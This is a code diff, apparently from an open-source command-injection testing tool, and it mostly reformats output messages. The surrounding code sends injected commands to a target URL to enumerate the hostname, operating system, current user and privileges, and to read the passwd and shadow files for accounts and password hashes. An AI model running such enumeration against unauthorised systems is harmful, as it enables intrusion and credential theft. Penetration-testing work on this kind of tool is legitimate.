@@ -27,10 +27,7 @@ from src.core.injections.results_based.techniques.eval_based import eb_injector
 """
 
 def do_check(separator,TAG,prefix,suffix,http_request_method,url,vuln_parameter):
-  
-  #if not menu.options.verbose:
-    #print ""
-    
+      
   # Hostname enumeration
   if menu.options.hostname:
     cmd = settings.HOSTNAME
@@ -42,7 +39,7 @@ def do_check(separator,TAG,prefix,suffix,http_request_method,url,vuln_parameter)
       shell = "".join(str(p) for p in shell)
       if not menu.options.verbose:
 	print ""
-      sys.stdout.write(colors.BOLD + "(!) The hostname is " + colors.UNDERL + shell + colors.RESET + ".")
+      sys.stdout.write(colors.BOLD + "(!) The hostname is " + colors.UNDERL + shell + colors.RESET + ".\n")
       sys.stdout.flush()
       
   # Retrieve system information
@@ -57,13 +54,12 @@ def do_check(separator,TAG,prefix,suffix,http_request_method,url,vuln_parameter)
 	response = eb_injector.injection(separator,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter)
 	target_arch = eb_injector.injection_results(response,TAG)
 	if target_arch:
-	  print ""
 	  target_arch = "".join(str(p) for p in target_arch)
 	  sys.stdout.write(colors.BOLD + "(!) The target operating system is " + colors.UNDERL + target_os + colors.RESET)
-	  sys.stdout.write(colors.BOLD + " and the hardware platform is " + colors.UNDERL + target_arch + colors.RESET + ".")
+	  sys.stdout.write(colors.BOLD + " and the hardware platform is " + colors.UNDERL + target_arch + colors.RESET + ".\n")
 	  sys.stdout.flush()
       else:
-	sys.stdout.write(colors.BOLD + "(!) The target operating system is " + colors.UNDERL + target_os + colors.RESET + ".")
+	sys.stdout.write(colors.BOLD + "(!) The target operating system is " + colors.UNDERL + target_os + colors.RESET + ".\n")
 	sys.stdout.flush()
 
   # The current user enumeration
@@ -79,17 +75,16 @@ def do_check(separator,TAG,prefix,suffix,http_request_method,url,vuln_parameter)
 	response = eb_injector.injection(separator,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter)
 	shell = eb_injector.injection_results(response,TAG)
 	if shell:
-	  #print ""
 	  shell = "".join(str(p) for p in shell)
-	  sys.stdout.write(colors.BOLD + "\n(!) The current user is " + colors.UNDERL + cu_account + colors.RESET)
+	  sys.stdout.write(colors.BOLD + "(!) The current user is " + colors.UNDERL + cu_account + colors.RESET)
 	  if shell != "0":
-	      sys.stdout.write(colors.BOLD + " and it is " + colors.UNDERL + "not" + colors.RESET + colors.BOLD + " privilleged" + colors.RESET + ".")
+	      sys.stdout.write(colors.BOLD + " and it is " + colors.UNDERL + "not" + colors.RESET + colors.BOLD + " privilleged" + colors.RESET + ".\n")
 	      sys.stdout.flush()
 	  else:
-	    sys.stdout.write(colors.BOLD + " and it is " + colors.UNDERL + "" + colors.RESET + colors.BOLD + " privilleged" + colors.RESET + ".")
+	    sys.stdout.write(colors.BOLD + " and it is " + colors.UNDERL + "" + colors.RESET + colors.BOLD + " privilleged" + colors.RESET + ".\n")
 	    sys.stdout.flush()
       else:
-	sys.stdout.write(colors.BOLD + "\n(!) The current user is " + colors.UNDERL + cu_account + colors.RESET + ".")
+	sys.stdout.write(colors.BOLD + "(!) The current user is " + colors.UNDERL + cu_account + colors.RESET + ".\n")
 	sys.stdout.flush()
 	
   # System users password hashes enumeration
@@ -102,7 +97,7 @@ def do_check(separator,TAG,prefix,suffix,http_request_method,url,vuln_parameter)
       sys_users = sys_users.replace("(@)","\n")
       sys_users = sys_users.split( )
       if len(sys_users) != 0 :
-	sys.stdout.write("\n(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
+	sys.stdout.write("(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
 	sys.stdout.flush()
 	sys.stdout.write(colors.BOLD + "\n(!) Identified " + str(len(sys_users)) + " entries in '" + settings.PASSWD_FILE + "'.\n" + colors.RESET)
 	sys.stdout.flush()
@@ -127,11 +122,11 @@ def do_check(separator,TAG,prefix,suffix,http_request_method,url,vuln_parameter)
 	      is_privilleged = ""
 	  else :
 	    is_privilleged = ""
-	  print "  ("+str(count)+") '" + colors.BOLD + colors.UNDERL + fields[0]+ colors.RESET + "'" + colors.BOLD + is_privilleged + colors.RESET + "(uid=" + fields[1] + ").Home directory is in '" + colors.BOLD + fields[2]+ colors.RESET + "'." 
+	  print "  ("+str(count)+") '" + colors.BOLD + colors.UNDERL + fields[0]+ colors.RESET + "'" + colors.BOLD + is_privilleged + colors.RESET + "(uid=" + fields[1] + "). Home directory is in '" + colors.BOLD + fields[2]+ colors.RESET + "'." 
       else:
 	print colors.BGRED + "\n(x) Error: Cannot open '" + settings.PASSWD_FILE + "'." + colors.RESET
 
-  # System users enumeration
+    # System password enumeration
   if menu.options.passwords:
     cmd = settings.SYS_PASSES	    
     response = eb_injector.injection(separator,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter)
@@ -141,7 +136,7 @@ def do_check(separator,TAG,prefix,suffix,http_request_method,url,vuln_parameter)
       sys_passes = sys_passes.replace("(@)","\n")
       sys_passes = sys_passes.split( )
       if len(sys_passes) != 0 :
-	sys.stdout.write("\n(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
+	sys.stdout.write("(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
 	sys.stdout.flush()
 	sys.stdout.write("[ " + colors.GREEN + "SUCCEED" + colors.RESET + " ]")
 	sys.stdout.write(colors.BOLD + "\n(!) Identified " + str(len(sys_passes)) + " entries in '" + settings.SHADOW_FILE + "'.\n" + colors.RESET)
